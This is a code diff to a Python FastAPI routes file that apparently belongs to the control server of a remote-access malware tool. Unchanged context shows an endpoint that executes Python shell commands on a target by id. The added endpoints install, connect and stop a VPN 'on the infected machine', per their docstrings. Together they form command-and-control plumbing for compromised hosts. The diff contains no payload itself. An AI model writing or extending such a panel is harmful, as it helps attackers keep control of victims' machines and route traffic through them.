@@ -1,6 +1,7 @@
 # api/routes/routes.py
 from fastapi import APIRouter, Depends, Request, Query
 from api.service.userService import UserService
+from api.service.vpnService import VpnService
 
 router = APIRouter()
 
@@ -8,6 +9,11 @@ def getUserService(request: Request) -> UserService:
     data_manager = request.app.state.app_state.data_manager
     user_service = UserService(data_manager.user_repository, data_manager.lock)     # Create UserService with UserRepository
     return user_service
+
+def getVpnService(request: Request) -> VpnService:
+    data_manager = request.app.state.app_state.data_manager
+    vpn_service = VpnService(data_manager.vpn_manager)     # Create VpnService with UserRepository
+    return vpn_service
 
 @router.get("/api/users")
 async def getAllUsers(user_service: UserService = Depends(getUserService)):
@@ -42,3 +48,45 @@ async def execute_python_shell(id: str, command: str, user_service: UserService 
         The result of the executed command.
     """
     return await user_service.executePythonShell(id, command)
+
+@router.get("/api/modules/vpn/install")
+async def install_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
+    """
+    Install a VPN on the infected machine.
+
+    Args:
+        uuid (str): The user ID to install the VPN on.
+        user_service (UserService): The service to handle user operations.
+
+    Returns:
+        The result of the VPN installation.
+    """
+    return await vpn_service.install_vpn(id)
+
+@router.get("/api/modules/vpn/connect")
+async def connect_to_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
+    """
+    Connect to a VPN on the infected machine.
+
+    Args:
+        id (str): The user ID to connect to the VPN on.
+        vpn_service (VpnService): The service to handle user operations.
+
+    Returns:
+        The result of connecting to the VPN.
+    """
+    return await vpn_service.connect_to_vpn(id)
+
+@router.get("/api/modules/vpn/stop")
+async def stop_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
+    """
+    Stop the VPN on the infected machine.
+
+    Args:
+        id (str): The user ID to stop the VPN on.
+        user_service (UserService): The service to handle user operations.
+
+    Returns:
+        The result of stopping the VPN.
+    """
+    return await vpn_service.stop_vpn(id)
